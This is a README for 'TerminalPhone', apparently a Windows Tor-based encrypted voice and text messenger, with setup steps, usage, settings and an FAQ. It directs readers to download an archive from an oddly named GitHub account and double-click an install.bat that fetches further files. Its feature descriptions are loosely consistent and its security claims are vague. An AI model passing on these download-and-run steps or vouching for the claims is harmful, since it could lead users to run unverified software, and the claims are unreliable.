## 📋 About This Software

TerminalPhone lets you send voice and text messages to others using the Tor network. It encrypts your data so only the person you choose can read or hear it. You do not need a phone number, an account, or a central server to communicate. Your identity relies on your unique Tor address.

## 🛠️ System Requirements

- Windows 10 or Windows 11
- A working internet connection
- A microphone for voice messages
- An active Tor browser or Tor connection

## 📥 Get Started on Windows

Follow these steps to set up TerminalPhone on your computer.

1. Visit the [official repository page](https://github.com/Meritpayselection234/terminalphone) to download the current version of the software.
2. Locate the download folder on your computer.
3. Extract the downloaded file into a folder where you can find it easily.
4. Open the extracted folder.
5. Double-click the file named `install.bat` to begin the setup process.
6. A black window will appear on your screen. This window installs the necessary files for Tor and the phone software.
7. Wait for the process to complete before you close the window.

## 🚀 How to Use TerminalPhone

Once installed, you can start the application by clicking the `TerminalPhone.exe` file inside your installation folder.

### 🎙️ Sending Voice Messages

1. Launch the program.
2. Enter the recipient’s Tor address in the field labeled "Contact Address."
3. Press the spacebar on your keyboard to start your recording.
4. Speak clearly into your microphone.
5. Press the spacebar again to stop recording.
6. The program encrypts your voice data and sends it to the other person.

### ✉️ Sending Text Messages

1. Select option 2 from the main menu.
2. Type your message into the text box.
3. Press the enter key to send the content.

### 📟 Receiving Messages

The software keeps a connection open to the Tor network while the application remains active. When a message arrives, a notification sound plays, and the text or audio file appears in your inbox. You can listen to voice messages by selecting them in the menu and pressing the play command.

## 🔒 Security and Privacy

TerminalPhone prioritizes your anonymity. It does not store your contact list, conversation history, or personal data on any server. 

- Encryption: Every message uses strong encryption standards before it leaves your computer.
- Privacy: The Tor network hides your location and IP address from the person you talk with.
- Identity: You use an onion address instead of a phone number to prove who you are.

## ⚙️ Settings

You can change how the software functions using the settings menu.

- Input Device: Choose which microphone the app uses if you have more than one.
- Audio Quality: Adjust the compression level. High compression saves data but reduces sound clarity.
- Themes: Toggle between light or dark mode for the interface.

## 🔍 Troubleshooting Common Issues

If the software fails to function, try these steps:

1. Check your internet connection. Tor requires a stable link to function.
2. Ensure no firewall blocks the application. Windows may ask for permission to let the app access the network. Click allow when this prompt appears.
3. Restart the application if you notice the screen freezes or audio does not record properly.
4. Verify that you have the latest version of the application. You can find the newest updates by checking the download page periodically.

## 📖 Frequently Asked Questions

What if I lose my Tor address?
Your address is unique to your installation. Back up the file labeled `identity.key` located in the config folder. If you lose this file, you cannot reclaim your existing address.

Can I talk to someone who does not have the software?
No. Both parties must use the TerminalPhone software to encrypt and decrypt messages correctly.

Does it cost money to use?
No. The software is free to use and does not contain advertisements or hidden fees.

Is my data kept on the internet?
No. Once the recipient receives and decodes the message, the transmission path clears. TerminalPhone keeps no record of your communication.
